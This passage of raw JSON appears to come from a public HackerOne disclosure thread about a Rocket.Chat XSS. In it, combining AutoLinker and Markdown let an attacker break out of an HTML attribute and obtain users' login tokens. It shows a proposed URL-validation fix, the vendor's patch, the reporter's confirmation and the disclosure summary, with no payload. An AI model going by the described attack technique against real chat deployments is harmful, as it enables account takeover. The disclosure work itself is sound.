update!\n\nBest\nMarkus","automated_response":false,"created_at":"2020-07-28T04:29:38.736Z","updated_at":"2020-07-28T04:29:38.736Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9053848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat,\n\nI think I found a way to fix this, even it's an ugly approach.\nMy approach is to prevent link rendering when any other markdown-token is present in the url.\nTo do so, I modified [markdown.js/validateUrl ](https://github.com/RocketChat/Rocket.Chat/blob/develop/app/markdown/lib/parser/original/markdown.js):\n\n```javascript\nconst validateUrl = (url, presentTokens) =\u003e {\n\ttry {\n\t\tnew URL(url);\n\t\treturn !(presentTokens \n\t\t\t\u0026\u0026 presentTokens.length \u003e 0 \n\t\t\t\u0026\u0026 new RegExp(presentTokens.join(\"|\")).test(url));\n\t} catch (e) {\n\t\treturn false;\n\t}\n};\n```\n\nNot sure if this helps....\n\nBest\nsectex","automated_response":false,"created_at":"2020-08-27T12:22:03.371Z","updated_at":"2020-08-27T12:22:03.371Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9062126,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sectex \n\nthanks a lot for your suggestion! It is always welcome! I will take it to the team and get a response soon. \n\nBest\nMarkus","automated_response":false,"created_at":"2020-08-28T04:26:38.610Z","updated_at":"2020-08-28T04:26:38.610Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9634743,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @markus-rocketchat,\n\nIs it ok to submit a PR with a decent title so this will be fixed?\n\nBest, sectex","automated_response":false,"created_at":"2020-10-26T12:12:40.168Z","updated_at":"2020-10-26T12:12:40.168Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9654547,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sectex \n\ndo you mean like in a private fork or such?\n\nBest regards","automated_response":false,"created_at":"2020-10-28T01:27:00.902Z","updated_at":"2020-10-28T01:27:00.902Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9656146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I mean a pull request with a title like 'improve markdown' or something.","automated_response":false,"created_at":"2020-10-28T08:03:57.213Z","updated_at":"2020-10-28T08:03:57.213Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10500185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sectex \n\nthis should be fixed in 3.11, 3.10.5, 3.9.7, 3.8.8. Can you confirm from your side or if you can still bypass it?\n\nthanks!","automated_response":false,"created_at":"2021-01-27T21:53:09.264Z","updated_at":"2021-01-27T21:53:09.264Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10503296,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat!\n\nThe changes look good to me! (https://github.com/RocketChat/Rocket.Chat/commit/c5cb24ccc28b5ef3116178f851f1752bc7c5deea#diff-94e0ebb0018914f8723474e701339458ef90809dc46f9b148ab01ef63a8f7415)\nI tested using v3.10.5 and wasn't able to bypass it.","automated_response":false,"created_at":"2021-01-28T08:42:05.651Z","updated_at":"2021-01-28T08:42:05.651Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10506609,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thats great news, @sectex \nthanks for your feedback!","automated_response":false,"created_at":"2021-01-28T14:23:49.254Z","updated_at":"2021-01-28T14:23:49.254Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10718464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @markus-rocketchat,\nCan we update the status of this report? \nThanks in advance.","automated_response":false,"created_at":"2021-02-19T11:12:00.040Z","updated_at":"2021-02-19T11:12:00.040Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10828123,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"oh yes, of course! Thanks again for your patience and dedication in helping us resolve this!! This was an important fix for our users.\n\nBest\nMarkus","automated_response":false,"created_at":"2021-02-28T01:38:46.871Z","updated_at":"2021-02-28T01:38:46.871Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sectex","url":"/sectex"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10835050,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this with a short summary/description?","automated_response":false,"created_at":"2021-03-01T08:30:23.529Z","updated_at":"2021-03-01T08:30:23.529Z","first_to_agree":true,"actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11037083,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sectex \nyes! I added a summary. Is it visible to you?","automated_response":false,"created_at":"2021-03-18T00:59:11.212Z","updated_at":"2021-03-18T00:59:11.212Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11038355,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes it's visible. Many thanks!","automated_response":false,"created_at":"2021-03-18T06:21:23.254Z","updated_at":"2021-03-18T06:21:23.254Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11194805,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-03-31T08:30:49.570Z","updated_at":"2021-03-31T08:30:49.570Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Rocket.Chat"}},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":31732,"category":"team","content":"An XSS was reported combining AutoLinker and Markdown. By combining AutoLinker and Markdown one could trick the parser into breaking out of the current HTML attribute, resulting in i.a. the possibility to obtain the login-token of a user.\nAn initial attempt to fix the problem did not successfully mitigate the problem, as the reporter was able to continue the exploit with minor adjustments.\nThe reporter suggested various mitigation strategies.\na fix was then released for version 3.11, 3.10.5, 3.9.7, 3.8.8.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":548530,"username":"markus-rocketchat","name":"markus-rocketchat","bio":"","cleared":false,"website":null,"location":"","created_at":"2019-03-18T21:02:05.125Z","url":"https://hackerone.com/markus-rocketchat","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}